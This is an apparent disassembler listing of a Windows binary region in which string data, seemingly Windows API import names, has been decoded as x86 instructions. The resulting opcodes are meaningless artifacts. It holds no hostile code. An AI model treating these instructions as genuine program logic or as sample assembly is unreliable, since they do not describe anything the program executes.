  412e27:	arpl   WORD PTR [edi+0x6e],bp
  412e2a:	add    BYTE PTR [eax],al
  412e2c:	mov    ds:0x57734901,al
  412e31:	imul   ebp,DWORD PTR [esi+0x64],0x6e55776f
  412e38:	imul   esp,DWORD PTR [ebx+0x6f],0xce006564
  412e3f:	add    DWORD PTR [ebp+0x65],ecx
  412e42:	jae    0x412eb7
  412e44:	popa   
  412e45:	addr16 gs inc edx
  412e48:	outs   dx,DWORD PTR ds:[esi]
  412e49:	js     0x412e8c
  412e4b:	add    BYTE PTR [ebp+0x61724400],dh
  412e51:	ja     0x412ea0
  412e53:	outs   dx,BYTE PTR gs:[esi]
  412e55:	jne    0x412e99
  412e57:	popa   
  412e58:	jb     0x412e5a
  412e5a:	inc    edx
  412e5b:	add    dl,BYTE PTR [ebx+0x65]
  412e5e:	je     0x412ea6
  412e60:	outs   dx,DWORD PTR ds:[esi]
  412e61:	jb     0x412ec8
  412e63:	addr16 jb 0x412ed5
  412e66:	jne    0x412ed6
  412e68:	fs push edi
  412e6a:	imul   ebp,DWORD PTR [esi+0x64],0xc200776f
  412e71:	add    dh,BYTE PTR [edi+0x76]
  412e74:	jae    0x412ee6
  412e76:	jb     0x412ee1
  412e78:	outs   dx,BYTE PTR ds:[esi]
  412e79:	je     0x412ee1
  412e7b:	push   edi
  412e7c:	add    BYTE PTR [eax],al
  412e7e:	mov    al,ds:0x57734901
  412e83:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412e8a:	push   ebp
  412e8b:	add    DWORD PTR [edi+0x65],eax
  412e8e:	je     0x412ee3
  412e90:	arpl   WORD PTR [edx+0x6f],si
  412e93:	ins    BYTE PTR es:[edi],dx
  412e94:	ins    BYTE PTR es:[edi],dx
  412e95:	push   eax
  412e96:	outs   dx,DWORD PTR ds:[esi]
  412e97:	jae    0x412e99
  412e99:	add    al,dh
  412e9b:	add    BYTE PTR [edi+0x65],al
  412e9e:	je     0x412ee1
  412ea0:	jae    0x412f1b
  412ea2:	outs   dx,BYTE PTR ds:[esi]
  412ea3:	arpl   WORD PTR [ebx+0x65],cx
  412ea6:	jns    0x412efb
  412ea8:	je     0x412f0b
  412eaa:	je     0x412f11
  412eac:	add    BYTE PTR [eax],al
  412eae:	or     eax,0x74654701
  412eb3:	inc    esp
  412eb4:	imul   esp,DWORD PTR [ecx+0x6c],0x6142676f
  412ebb:	jae    0x412f22
  412ebd:	push   ebp
  412ebe:	outs   dx,BYTE PTR ds:[esi]
  412ebf:	imul   esi,DWORD PTR [ebx+esi*2+0x0],0x5502a500
  412ec7:	jo     0x412f2d
  412ec9:	popa   
  412eca:	je     0x412f31
  412ecc:	push   edi
  412ecd:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  412ed4:	or     eax,DWORD PTR [ecx]
  412ed6:	inc    edi
  412ed7:	gs je  0x412f1e
  412eda:	inc    ebx
  412edb:	inc    ebp
  412edc:	js     0x412ede
  412ede:	stos   DWORD PTR es:[edi],eax
  412edf:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  412ee3:	fs inc ebx
  412ee5:	jne    0x412f59
  412ee7:	jae    0x412f58
  412ee9:	jb     0x412f2c
  412eeb:	add    BYTE PTR [edx+eax*1+0x53],bl
  412eef:	gs je  0x412f45
  412ef2:	arpl   WORD PTR [edx+0x6f],si
  412ef5:	ins    BYTE PTR es:[edi],dx
  412ef6:	ins    BYTE PTR es:[edi],dx
  412ef7:	push   edx
  412ef8:	popa   
  412ef9:	outs   dx,BYTE PTR ds:[esi]
  412efa:	add    BYTE PTR gs:[bx+si],al
  412efe:	cmp    DWORD PTR [eax],eax
  412f00:	inc    ebx
  412f01:	push   0x70557261
  412f06:	jo     0x412f6d
  412f08:	jb     0x412f61
  412f0a:	add    BYTE PTR [eax],al
  412f0c:	fwait
  412f0d:	add    dl,BYTE PTR [ebp+0x6e]
  412f10:	ins    BYTE PTR es:[edi],dx
  412f11:	outs   dx,DWORD PTR ds:[esi]
  412f12:	popa   
  412f13:	fs dec ebx
  412f15:	gs jns 0x412f7a
  412f18:	outs   dx,DWORD PTR ds:[esi]
  412f19:	popa   
  412f1a:	jb     0x412f80
  412f1c:	dec    esp
  412f1d:	popa   
  412f1e:	jns    0x412f8f
  412f20:	jne    0x412f96
  412f22:	add    BYTE PTR [eax],al
  412f24:	push   esi
  412f25:	add    DWORD PTR [edi+0x65],eax
  412f28:	je     0x412f7d
  412f2a:	arpl   WORD PTR [edx+0x6f],si
  412f2d:	ins    BYTE PTR es:[edi],dx
  412f2e:	ins    BYTE PTR es:[edi],dx
  412f2f:	push   edx
  412f30:	popa   
  412f31:	outs   dx,BYTE PTR ds:[esi]
  412f32:	add    BYTE PTR gs:[bx+si],al
  412f36:	ins    DWORD PTR es:[edi],dx
  412f37:	add    DWORD PTR [edi+0x65],eax
  412f3a:	je     0x412f93
  412f3c:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  412f43:	outs   dx,BYTE PTR ds:[esi]
  412f44:	addr16 push edi
  412f46:	add    BYTE PTR [eax],al
  412f48:	add    BYTE PTR [ecx],0x49
  412f4b:	outs   dx,BYTE PTR ds:[esi]
  412f4c:	data16 ins BYTE PTR es:[edi],dx
  412f4e:	popa   
  412f4f:	je     0x412fb6
  412f51:	push   edx
  412f52:	arpl   WORD PTR gs:[eax+eax*1+0x16],si
  412f57:	add    dl,BYTE PTR [edx+0x65]
  412f5a:	ins    DWORD PTR es:[edi],dx
  412f5b:	outs   dx,DWORD PTR ds:[esi]
  412f5c:	jbe    0x412fc3
  412f5e:	dec    ebp
  412f5f:	outs   dx,BYTE PTR gs:[esi]
  412f61:	jne    0x412f63
  412f63:	add    BYTE PTR [ebx+0x61724400],ch
  412f69:	ja     0x412fac
  412f6b:	outs   dx,BYTE PTR ds:[esi]
  412f6c:	imul   ebp,DWORD PTR [ebp+0x61],0x52646574
  412f73:	arpl   WORD PTR gs:[ebx+esi*2+0x0],si
  412f78:	das    
  412f79:	add    dl,BYTE PTR [ebx+0x65]
  412f7c:	je     0x412fbf
  412f7e:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  412f82:	gs push edi
  412f84:	imul   ebp,DWORD PTR [esi+0x64],0x9c00776f
  412f8b:	add    BYTE PTR [ecx+ebp*2+0x61],al
  412f8f:	ins    BYTE PTR es:[edi],dx
  412f90:	outs   dx,DWORD PTR ds:[esi]
  412f91:	addr16 inc edx
  412f93:	outs   dx,DWORD PTR ds:[esi]
  412f94:	js     0x412fe6
  412f96:	popa   
  412f97:	jb     0x412ffa
  412f99:	ins    DWORD PTR es:[edi],dx
  412f9a:	inc    ecx
  412f9b:	add    bh,ah
  412f9d:	add    BYTE PTR [esi+0x72],al
  412fa0:	popa   
  412fa1:	ins    DWORD PTR es:[edi],dx
  412fa2:	gs push edx
  412fa4:	arpl   WORD PTR gs:[eax+eax*1-0x68],si
  412fa9:	add    DWORD PTR [ecx+0x73],ecx
  412fac:	inc    esp
  412fad:	imul   esp,DWORD PTR [ecx+0x6c],0x654d676f
  412fb4:	jae    0x413029
  412fb6:	popa   
  412fb7:	addr16 gs push edi
  412fba:	add    BYTE PTR [eax],al
  412fbc:	xor    DWORD PTR [eax],eax
  412fbe:	inc    ebx
  412fbf:	push   0x72507261
  412fc4:	gs jbe 0x41301e
  412fc7:	add    BYTE PTR ds:0x74654701,dl
  412fcd:	inc    esi
  412fce:	outs   dx,DWORD PTR ds:[esi]
  412fcf:	jb     0x413036
  412fd1:	addr16 jb 0x413043
  412fd4:	jne    0x413044
  412fd6:	fs push edi
  412fd8:	imul   ebp,DWORD PTR [esi+0x64],0xb700776f
  412fdf:	add    dl,BYTE PTR [edi+0x61]
  412fe2:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x706e4972
  412fea:	jne    0x413060
  412fec:	dec    ecx
  412fed:	fs ins BYTE PTR es:[edi],dx
  412fef:	add    BYTE PTR gs:[eax],al
  412ff2:	push   edi
  412ff3:	add    dl,BYTE PTR [ebx+0x65]
  412ff6:	je     0x413048
  412ff8:	jb     0x413069
  412ffa:	jo     0x413053
  412ffc:	add    BYTE PTR [eax],al
  412ffe:	dec    eax
  412fff:	add    dl,BYTE PTR [ebx+0x65]
  413002:	je     0x413051
  413004:	outs   dx,BYTE PTR gs:[esi]
  413006:	jne    0x413008
  413008:	scas   al,BYTE PTR es:[edi]
  413009:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41300d:	fs inc ebx
  41300f:	jne    0x413083
  413011:	jae    0x413082
  413013:	jb     0x41306c
  413015:	add    BYTE PTR [edi+0x2],bl
  413018:	push   ebx
  413019:	gs je  0x41306f
  41301c:	jns    0x413091
  41301e:	inc    ebx
  41301f:	outs   dx,DWORD PTR ds:[esi]
  413020:	ins    BYTE PTR es:[edi],dx
  413021:	outs   dx,DWORD PTR ds:[esi]
  413022:	jb     0x413097
  413024:	add    BYTE PTR [eax],al
  413026:	xchg   esp,eax
  413027:	add    dl,BYTE PTR [edx+esi*2+0x61]
  41302b:	outs   dx,BYTE PTR ds:[esi]
  41302c:	jae    0x41309a
  41302e:	popa   
  41302f:	je     0x413096
  413031:	inc    ecx
  413032:	arpl   WORD PTR [ebx+0x65],sp
  413035:	ins    BYTE PTR es:[edi],dx
  413036:	gs jb  0x41309a
  413039:	je     0x4130aa
  41303b:	jb     0x413094
  41303d:	add    BYTE PTR [edi+0x66654400],cl
  413043:	push   edi
  413044:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  41304b:	outs   dx,DWORD PTR ds:[esi]
  41304c:	arpl   WORD PTR [edi+0x0],dx
  41304f:	add    BYTE PTR [ecx+0x0],ah
  413052:	inc    ebx
  413053:	jb     0x4130ba
  413055:	popa   
  413056:	je     0x4130bd
  413058:	push   eax
  413059:	outs   dx,DWORD PTR ds:[esi]
  41305a:	jo     0x4130d1
  41305c:	jo     0x4130ab
  41305e:	outs   dx,BYTE PTR gs:[esi]
  413060:	jne    0x413062
  413062:	push   ecx
  413063:	add    dl,BYTE PTR [ebx+0x65]
  413066:	je     0x4130b8
  413068:	popa   
  413069:	jb     0x4130d0
  41306b:	outs   dx,BYTE PTR ds:[esi]
  41306c:	je     0x41306e
  41306e:	popf   
  41306f:	add    BYTE PTR [ecx+ebp*2+0x61],al
  413073:	ins    BYTE PTR es:[edi],dx
  413074:	outs   dx,DWORD PTR ds:[esi]
  413075:	addr16 inc edx
  413077:	outs   dx,DWORD PTR ds:[esi]
  413078:	js     0x4130ca
  41307a:	popa   
  41307b:	jb     0x4130de
  41307d:	ins    DWORD PTR es:[edi],dx
  41307e:	push   edi
  41307f:	add    BYTE PTR [edx+0x6c695402],cl
  413085:	gs push edi
  413087:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  41308e:	sub    DWORD PTR [eax],eax
  413090:	inc    ebx
  413091:	push   0x6f4c7261
  413096:	ja     0x4130fd
  413098:	jb     0x4130f1
  41309a:	add    BYTE PTR [eax],al
  41309c:	out    dx,eax
  41309d:	add    DWORD PTR [eax+0x65],edx
  4130a0:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  4130a5:	jae    0x413108
  4130a7:	addr16 gs push edi
  4130aa:	add    BYTE PTR [eax],al
  4130ac:	jne    0x4130af
  4130ae:	inc    edi
  4130af:	gs je  0x413109
  4130b2:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  4130b9:	js     0x41312f
  4130bb:	inc    ecx
  4130bc:	add    BYTE PTR [eax],al
  4130be:	add    DWORD PTR ds:[edi+0x65],eax
  4130c2:	je     0x413111
  4130c4:	gs jae 0x41313a
  4130c7:	popa   
  4130c8:	addr16 gs push edi
  4130cb:	add    BYTE PTR ds:0x61684300,ch
  4130d1:	jb     0x413121
  4130d3:	gs js  0x41314a
  4130d6:	push   edi
  4130d7:	add    BYTE PTR [ecx+eax*1+0x64616f4c],bh
  4130de:	push   ebx
  4130df:	je     0x413153
  4130e1:	imul   ebp,DWORD PTR [esi+0x67],0x2800057
  4130e8:	push   ebx
  4130e9:	push   0x6957776f
  4130ee:	outs   dx,BYTE PTR ds:[esi]
  4130ef:	outs   dx,DWORD PTR fs:[esi]
  4130f1:	ja     0x413134
  4130f3:	jae    0x41316e
  4130f5:	outs   dx,BYTE PTR ds:[esi]
  4130f6:	arpl   WORD PTR [eax],ax
  4130f8:	add    BYTE PTR ss:[ebx+0x68],al
  4130fc:	popa   
  4130fd:	jb     0x413154
  4130ff:	jo     0x413171
  413101:	gs jb  0x413145
  413104:	add    BYTE PTR [eax],al
  413106:	sti    
  413107:	add    DWORD PTR [eax+0x74],edx
  41310a:	dec    ecx
  41310b:	outs   dx,BYTE PTR ds:[esi]
  41310c:	push   edx
  41310d:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  413112:	sbb    eax,DWORD PTR [eax]
  413114:	inc    ebx
  413115:	popa   
  413116:	ins    BYTE PTR es:[edi],dx
  413117:	ins    BYTE PTR es:[edi],dx
  413118:	push   edi
  413119:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  413120:	outs   dx,DWORD PTR ds:[esi]
  413121:	arpl   WORD PTR [edi+0x0],dx
  413124:	lahf   
  413125:	add    BYTE PTR [ecx+ebp*2+0x73],al
  413129:	jo     0x41318c
  41312b:	je     0x413190
  41312d:	push   0x7373654d
  413132:	popa   
  413133:	addr16 gs inc ecx
  413136:	add    BYTE PTR [eax],al
  413138:	mov    BYTE PTR [edx],al
  41313a:	push   esp
  41313b:	popa   
  41313c:	bound  esp,QWORD PTR [edx+0x65]
  41313f:	fs push esp
  413141:	gs js  0x4131b8
  413144:	dec    edi
  413145:	jne    0x4131bb
  413147:	push   edi
  413148:	add    BYTE PTR [eax],al
  41314a:	sub    eax,DWORD PTR [edx]
  41314c:	push   ebx
  41314d:	outs   dx,BYTE PTR gs:[esi]
  41314f:	fs dec ebp
  413151:	gs jae 0x4131c7
  413154:	popa   
  413155:	addr16 gs push edi
  413158:	add    BYTE PTR [eax],al
  41315a:	add    DWORD PTR fs:[edi+0x65],eax
  41315e:	je     0x4131b5
  413160:	jo     0x4131c6
  413162:	popa   
  413163:	je     0x4131ca
  413165:	push   edx
  413166:	outs   dx,BYTE PTR ds:[si]
  413168:	add    BYTE PTR [eax],al
  41316a:	mov    eax,0x61724400
  41316f:	ja     0x4131c4
  413171:	je     0x4131d4
  413173:	je     0x4131da
  413175:	push   edi
  413176:	add    BYTE PTR [eax],al
  413178:	sub    eax,0x74654701
  41317d:	dec    ebp
  41317e:	outs   dx,BYTE PTR gs:[esi]
  413180:	jne    0x4131c5
  413182:	push   0x4d6b6365
  413187:	popa   
  413188:	jb     0x4131f5
  41318a:	inc    esp
  41318b:	imul   ebp,DWORD PTR [ebp+0x65],0x6f69736e
  413192:	outs   dx,BYTE PTR ds:[esi]
  413193:	jae    0x413195
  413195:	add    BYTE PTR [ebx+0x616f4c01],bh
  41319b:	fs push ebx
  41319d:	je     0x413211
  41319f:	imul   ebp,DWORD PTR [esi+0x67],0x2590041
  4131a6:	push   ebx
  4131a7:	gs je  0x4131fc
  4131aa:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  4131af:	jo     0x413225
  4131b1:	jns    0x4131b3
  4131b3:	add    BYTE PTR [edi+0x0],dl
  4131b6:	inc    ebx
  4131b7:	jb     0x41321e
  4131b9:	popa   
  4131ba:	je     0x413221
  4131bc:	inc    esp
  4131bd:	imul   esp,DWORD PTR [ecx+0x6c],0x6e49676f
  4131c4:	imul   esi,DWORD PTR fs:[edx+0x65],0x61507463
  4131cc:	jb     0x41322f
  4131ce:	ins    DWORD PTR es:[edi],dx
  4131cf:	push   edi
  4131d0:	add    BYTE PTR [eax],al
  4131d2:	cmp    BYTE PTR [eax],al
  4131d4:	inc    ebx
  4131d5:	push   0x70557261
  4131da:	jo     0x413241
  4131dc:	jb     0x413220
  4131de:	jne    0x413246
  4131e0:	push   di
  4131e2:	add    BYTE PTR [eax],al
  4131e4:	ja     0x4131e7
  4131e6:	inc    edi
  4131e7:	gs je  0x413241
  4131ea:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  4131f1:	js     0x413267
  4131f3:	dec    esp
  4131f4:	outs   dx,BYTE PTR gs:[esi]
  4131f6:	addr16 je 0x413261
  4131f9:	push   edi
  4131fa:	add    BYTE PTR [eax],al
  4131fc:	xor    eax,0x61684300
  413201:	jb     0x413257
  413203:	outs   dx,DWORD PTR ds:[esi]
  413204:	dec    edi
  413205:	gs ins DWORD PTR es:[edi],dx
  413207:	push   edi
  413208:	add    BYTE PTR [eax],al
  41320a:	dec    edx
  41320b:	add    dl,BYTE PTR [ebx+0x65]
  41320e:	je     0x41325d
  413210:	outs   dx,BYTE PTR gs:[esi]
  413212:	jne    0x413258
  413214:	gs popaw 
  413217:	jne    0x413285
  413219:	je     0x413264
  41321b:	je     0x413282
  41321d:	ins    DWORD PTR es:[edi],dx
  41321e:	add    BYTE PTR [eax],al
  413220:	push   ebp
  413221:	push   ebx
  413222:	inc    ebp
  413223:	push   edx
  413224:	xor    esi,DWORD PTR [edx]
  413226:	cs fs ins BYTE PTR es:[edi],dx
  413229:	ins    BYTE PTR es:[edi],dx
  41322a:	add    BYTE PTR [eax],al
  41322c:	push   ebx
  41322d:	add    BYTE PTR [ecx+0x6d],cl
  413230:	popa   
  413231:	addr16 gs dec esp
  413234:	imul   esi,DWORD PTR [ebx+0x74],0x7465535f
  41323b:	dec    ecx
  41323c:	arpl   WORD PTR [edi+0x6e],bp
  41323f:	push   ebx
  413240:	imul   edi,DWORD PTR [edx+0x65],0x49005600
  413247:	ins    DWORD PTR es:[edi],dx
  413248:	popa   
  413249:	addr16 gs dec esp
  41324c:	imul   esi,DWORD PTR [ebx+0x74],0x6972575f
  413253:	je     0x4132ba
  413255:	add    BYTE PTR [esi+0x0],cl
  413258:	dec    ecx
  413259:	ins    DWORD PTR es:[edi],dx
  41325a:	popa   
  41325b:	addr16 gs dec esp
  41325e:	imul   esi,DWORD PTR [ebx+0x74],0x7065525f
  413265:	ins    BYTE PTR es:[edi],dx
  413266:	popa   
  413267:	arpl   WORD PTR [ebp+0x49],sp
  41326a:	arpl   WORD PTR [edi+0x6e],bp
  41326d:	add    BYTE PTR [esi],dh
  41326f:	add    BYTE PTR [ecx+0x6d],cl
  413272:	popa   
  413273:	addr16 gs dec esp
  413276:	imul   esi,DWORD PTR [ebx+0x74],0x6172445f
  41327d:	ja     0x41327f
  41327f:	add    BYTE PTR [ebx],dl
  413281:	add    BYTE PTR [ebx+0x72],al
  413284:	gs popa 
  413286:	je     0x4132ed
  413288:	push   eax
  413289:	jb     0x4132fa
  41328b:	jo     0x4132f2
  41328d:	jb     0x413303
  41328f:	jns    0x4132e4
  413291:	push   0x50746565
  413296:	popa   
  413297:	addr16 gs push edi
  41329a:	add    BYTE PTR [eax],al
  41329c:	pop    esp
  41329d:	add    BYTE PTR [eax+0x72],dl
  4132a0:	outs   dx,DWORD PTR ds:[esi]
  4132a1:	jo     0x413308
  4132a3:	jb     0x413319
  4132a5:	jns    0x4132fa
  4132a7:	push   0x57746565
  4132ac:	add    BYTE PTR [eax],al
  4132ae:	inc    ebx
  4132af:	dec    edi
  4132b0:	dec    ebp
  4132b1:	inc    ebx
  4132b2:	push   esp
  4132b3:	dec    esp
  4132b4:	xor    esi,DWORD PTR [edx]
  4132b6:	cs fs ins BYTE PTR es:[edi],dx
  4132b9:	ins    BYTE PTR es:[edi],dx
  4132ba:	add    BYTE PTR [eax],al
  4132bc:	mov    WORD PTR [eax],es
  4132be:	inc    ebx
  4132bf:	jb     0x413326
  4132c1:	popa   
  4132c2:	je     0x413329
  4132c4:	inc    ebx
  4132c5:	outs   dx,DWORD PTR ds:[esi]
  4132c6:	ins    DWORD PTR es:[edi],dx
  4132c7:	jo     0x41332a
  4132c9:	je     0x413334
  4132cb:	bound  ebp,QWORD PTR [ebp+eiz*2+0x42]
  4132cf:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xa5000070
  4132d7:	add    BYTE PTR [ebx+0x72],al
  4132da:	gs popa 
  4132dc:	je     0x413343
  4132de:	push   eax
  4132df:	popa   
  4132e0:	ins    BYTE PTR es:[edi],dx
  4132e1:	gs je  0x413358
  4132e4:	add    BYTE PTR gs:[ebx+0x746e4901],dl
  4132eb:	gs jb  0x413361
  4132ee:	arpl   WORD PTR gs:[ebx+eax*2+0x6c],si
  4132f3:	imul   esi,DWORD PTR [eax+0x52],0x746365
  4132fa:	into   
  4132fb:	add    DWORD PTR [ebx+0x65],edx
  4132fe:	ins    BYTE PTR es:[edi],dx
  4132ff:	arpl   WORD PTR gs:[edi+ecx*2+0x62],si
  413304:	push   0x65
  413306:	arpl   WORD PTR [eax+eax*1+0x0],si
  41330a:	jp     0x41330d
  41330c:	inc    edi
  41330d:	gs je  0x413363
  413310:	jns    0x413385
  413312:	je     0x413379
  413314:	ins    DWORD PTR es:[edi],dx
  413315:	push   eax
  413316:	popa   
  413317:	ins    BYTE PTR es:[edi],dx
  413318:	gs je  0x41338f
  41331b:	gs push ebp
  41331d:	jae    0x413384
  41331f:	add    BYTE PTR [ecx+0x65724300],cl
  413325:	popa   
  413326:	je     0x41338d
  413328:	inc    edx
  413329:	jb     0x4133a0
  41332b:	jae    0x413395
  41332d:	dec    ecx
  41332e:	outs   dx,BYTE PTR ds:[esi]
  41332f:	imul   esi,DWORD PTR fs:[edx+0x65],0xe8007463
  413337:	add    DWORD PTR [ebx+0x65],edx
  41333a:	je     0x413389
  41333c:	popa   
  41333d:	jo     0x41338c
  41333f:	outs   dx,DWORD PTR ds:[esi]
  413340:	fs add BYTE PTR gs:[eax],al
  413344:	pop    esp
  413345:	add    DWORD PTR [edi+0x65],eax
  413348:	je     0x413396
  41334a:	popa   
  41334b:	jns    0x4133bc
  41334d:	jne    0x4133c3
  41334f:	add    bh,ch
  413351:	add    DWORD PTR [ebx+0x65],edx
  413354:	je     0x4133a6
  413356:	imul   edi,DWORD PTR [eax+0x65],0xc700006c
  41335d:	add    DWORD PTR [ebx+0x61],edx
  413360:	jbe    0x4133c7
  413362:	inc    esp
  413363:	inc    ebx
  413364:	add    BYTE PTR [eax],al
  413366:	pop    edi
  413367:	add    DWORD PTR [edi+0x65],eax
  41336a:	je     0x4133b9
  41336c:	popa   
  41336d:	jo     0x4133bc
  41336f:	outs   dx,DWORD PTR ds:[esi]
  413370:	fs add BYTE PTR gs:[eax],al
  413374:	mov    ds:0x65724300,al
  413379:	popa   
  41337a:	je     0x4133e1
  41337c:	dec    ecx
  41337d:	inc    ebx
  41337e:	push   edi
  41337f:	add    BYTE PTR [esi+0x65724300],dl
  413385:	popa   
  413386:	je     0x4133ed
  413388:	inc    ebp
  413389:	ins    BYTE PTR es:[edi],dx
  41338a:	ins    BYTE PTR es:[edi],dx
  41338b:	imul   esi,DWORD PTR [eax+0x74],0x67526369
  413392:	outs   dx,BYTE PTR ds:[esi]
  413393:	dec    ecx
  413394:	outs   dx,BYTE PTR ds:[esi]
  413395:	imul   esi,DWORD PTR fs:[edx+0x65],0x99007463
  41339d:	add    BYTE PTR [ebx+0x72],al
  4133a0:	gs popa 
  4133a2:	je     0x413409
  4133a4:	inc    esi
  4133a5:	outs   dx,DWORD PTR ds:[esi]
  4133a6:	outs   dx,BYTE PTR ds:[esi]
  4133a7:	je     0x4133ea
  4133a9:	add    BYTE PTR ds:0x61725402,cl
  4133af:	outs   dx,BYTE PTR ds:[esi]
  4133b0:	jae    0x41341e
  4133b2:	popa   
  4133b3:	je     0x41341a
  4133b5:	inc    ebx
  4133b6:	push   0x65737261
  4133bb:	je     0x413406
  4133bd:	outs   dx,BYTE PTR ds:[esi]
  4133be:	outs   dx,WORD PTR ds:[esi]
  4133c0:	add    BYTE PTR [eax],al
  4133c2:	out    dx,al
  4133c3:	add    DWORD PTR [ebx+0x65],edx
  4133c6:	je     0x413418
  4133c8:	popa   
  4133c9:	ins    BYTE PTR es:[edi],dx
  4133ca:	gs je  0x413441
  4133cd:	gs inc ebp
  4133cf:	outs   dx,BYTE PTR ds:[esi]
  4133d0:	je     0x413444
  4133d2:	imul   esp,DWORD PTR [ebp+0x73],0x5301d300
  4133d9:	gs je  0x41341e
  4133dc:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x6d694470
  4133e4:	outs   dx,BYTE PTR gs:[esi]
  4133e6:	jae    0x413451
  4133e8:	outs   dx,DWORD PTR ds:[esi]
  4133e9:	outs   dx,BYTE PTR ds:[esi]
  4133ea:	inc    ebp
  4133eb:	js     0x4133ed
  4133ed:	add    BYTE PTR [esi],al
  4133ef:	add    dl,BYTE PTR [ebx+0x74]
  4133f2:	jb     0x413459
  4133f4:	je     0x413459
  4133f6:	push   0x746c42
  4133fb:	add    BYTE PTR [eax+eax*1+0x61657243],dl
  413402:	je     0x413469
  413404:	inc    esp
  413405:	imul   esi,DWORD PTR [ebx+0x63],0x61647261
  41340c:	bound  ebp,QWORD PTR [ebp+eiz*2+0x42]
  413410:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x13f0070
  413418:	inc    edi
  413419:	gs je  0x413460
  41341c:	dec    ecx
  41341d:	inc    edx
  41341e:	inc    ebx
  41341f:	outs   dx,DWORD PTR ds:[esi]
  413420:	ins    BYTE PTR es:[edi],dx
  413421:	outs   dx,DWORD PTR ds:[esi]
  413422:	jb     0x413478
  413424:	popa   
  413425:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  413429:	add    BYTE PTR [edi+0x6e694c01],dl
  41342f:	gs push esp
  413431:	outs   dx,DWORD PTR ds:[esi]
  413432:	add    BYTE PTR [eax],al
  413434:	clc    
  413435:	add    DWORD PTR [ebx+0x65],edx
  413438:	je     0x41348e
  41343a:	gs js  0x4134b1
  41343d:	inc    ecx
  41343e:	ins    BYTE PTR es:[edi],dx
  41343f:	imul   esp,DWORD PTR [edi+0x6e],0x1a40000
  413446:	push   eax
  413447:	popa   
  413448:	je     0x41348c
  41344a:	ins    BYTE PTR es:[edi],dx
  41344b:	je     0x41344d
  41344d:	add    BYTE PTR [ebp+0x0],dh
  413450:	inc    edx
  413451:	imul   ebp,DWORD PTR gs:[bp+0x50],0x687461
  41345a:	test   al,0x0
  41345c:	inc    ebx
  41345d:	jb     0x4134c4
  41345f:	popa   
  413460:	je     0x4134c7
  413462:	push   eax
  413463:	outs   dx,BYTE PTR gs:[esi]
  413465:	dec    ecx
  413466:	outs   dx,BYTE PTR ds:[esi]
  413467:	imul   esi,DWORD PTR fs:[edx+0x65],0x83007463
  41346f:	add    DWORD PTR [edi+0x65],eax
  413472:	je     0x4134c8
  413474:	gs js  0x4134eb
  413477:	inc    ebp
  413478:	js     0x4134ee
  41347a:	outs   dx,BYTE PTR gs:[esi]
  41347c:	je     0x4134ce
  41347e:	outs   dx,DWORD PTR ds:[esi]
  41347f:	imul   ebp,DWORD PTR [esi+0x74],0x413233
  413486:	aam    0x1
  413488:	push   ebx
  413489:	gs je  0x4134ce
  41348c:	imul   eax,DWORD PTR [ebx+0x6f],0x6c
  413490:	outs   dx,DWORD PTR ds:[esi]
  413491:	jb     0x413493
  413493:	add    bl,dh
  413495:	add    DWORD PTR [ebx+0x65],edx
  413498:	je     0x4134ec
  41349a:	dec    edi
  41349b:	push   eax
  41349c:	xor    al,BYTE PTR [eax]
  41349e:	stos   BYTE PTR es:[edi],al
  41349f:	add    BYTE PTR [ebx+0x72],al
  4134a2:	gs popa 
  4134a4:	je     0x41350b
  4134a6:	push   eax
  4134a7:	outs   dx,DWORD PTR ds:[esi]
  4134a8:	ins    BYTE PTR es:[edi],dx
  4134a9:	jns    0x413512
  4134ab:	outs   dx,DWORD PTR ds:[esi]
  4134ac:	outs   dx,BYTE PTR ds:[esi]
  4134ad:	push   edx
  4134ae:	outs   dx,BYTE PTR ds:[si]
  4134b0:	add    BYTE PTR [eax],al
  4134b2:	xchg   DWORD PTR [ecx],eax
  4134b4:	inc    edi
  4134b5:	gs je  0x41350c
  4134b8:	gs js  0x41352f
  4134bb:	inc    ebp
  4134bc:	js     0x413532
  4134be:	outs   dx,BYTE PTR gs:[esi]
  4134c0:	je     0x413512
  4134c2:	outs   dx,DWORD PTR ds:[esi]
  4134c3:	imul   ebp,DWORD PTR [esi+0x74],0x2010057
  4134ca:	push   ebx
  4134cb:	gs je  0x413525
  4134ce:	imul   ebp,DWORD PTR [esi+0x64],0x724f776f
  4134d5:	addr16 inc ebp
  4134d7:	js     0x4134d9
  4134d9:	add    BYTE PTR [edi+0x65724300],ah
  4134df:	popa   
  4134e0:	je     0x413547
  4134e2:	push   eax
  4134e3:	outs   dx,BYTE PTR gs:[esi]
  4134e5:	add    BYTE PTR [esi+0x74654701],cl
  4134eb:	push   esi
  4134ec:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  4134f3:	dec    edi
  4134f4:	jb     0x41355d
  4134f6:	inc    ebp
  4134f7:	js     0x4134f9
  4134f9:	add    ch,cl
  4134fb:	add    BYTE PTR [ebp+0x73],al
  4134fe:	arpl   WORD PTR [ecx+0x70],sp
  413501:	add    BYTE PTR gs:[eax],al
  413504:	mov    bl,0x1
  413506:	push   eax
  413507:	outs   dx,DWORD PTR ds:[esi]
  413508:	ins    BYTE PTR es:[edi],dx
  413509:	jns    0x413572
  41350b:	outs   dx,DWORD PTR ds:[esi]
  41350c:	outs   dx,BYTE PTR ds:[esi]
  41350d:	add    BYTE PTR [ebx+0x65724300],ch
  413513:	popa   
  413514:	je     0x41357b
  413516:	push   edx
  413517:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  41351c:	outs   dx,BYTE PTR ds:[esi]
  41351d:	add    BYTE PTR [ecx+eax*1+0x54746547],al
  413524:	gs js  0x41359b
  413527:	inc    ebp
